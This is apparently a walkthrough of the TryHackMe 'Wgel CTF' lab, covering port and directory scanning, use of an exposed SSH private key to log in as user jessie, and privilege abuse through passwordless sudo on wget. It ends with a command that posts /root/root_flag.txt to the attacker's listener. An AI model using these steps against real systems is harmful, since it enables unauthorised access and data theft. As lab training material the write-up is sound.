# TryHackMe-WgelCTF-ctf-writeup

I will use $MY_IP as placeholder for the IP assigned to my machine in the thm VPN, and $MACHINE_IP as placeholder for the "victim host".

I start with default nmap (ran as root, so it would be a syn scan)

`nmap -A $MACHINE_IP -oN nmap_syn_def`

wich reveals me two open ports: 22 (ssh) and 80 (apache).

Browsing $MACHINE_IP I see the classic welcome page. I will launch gobuster 

`gobuster dir -x php -u $MACHINE_IP -w /usr/share/dirb/wordlists/common.txt`

I see some usual stuff along with "sitemap" folder. I browse it, it is some sort of blog, while looking trough its pages I will launch gobuster again starting from this path

`gobuster dir -x php -u $MACHINE_IP/sitemap -w /usr/share/dirb/wordlists/common.txt`

Around pages I don't see nothing useful but a form meant to "leave comments" wich seems not to be injectable.

The second gobuster scan reveals the path /sitemap/.ssh, browsing it I'm able to see a file "id_rsa" wich I download and set te right permissions to it

`chmod 600 id_rsa`

It could be server's root private key so I immediately give a shot:

`ssh -i id_rsa $MACHINE_IP`

It asks for root's password so it's noot root's private key. Around pages I also found some name wich I try to use the rsa key with with no results.

Finally, after looking at every pages source code, I find the username "jessie" in the apache welcome page.

`ssh -i id_rsa jessie@MACHINE_IP`

I'm in and I find the first flag under /home/jessie/Documents.

Next step is to retrieve's "user flag" which I suppose is in /root. 

I check jessie's sudo permissions:

`sudo -l`

and i find that I can run "wget" as root without being asked for a password, cool.

I set up a simple python server (here's the code https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) for handle POST requests and tried to send me (guessing the name from the other flag) the file /root/root_flag.txt

`wget --post-file=/root/root_flag.txt http://$MY_IP`

it was the right name and the file contained the last flag.
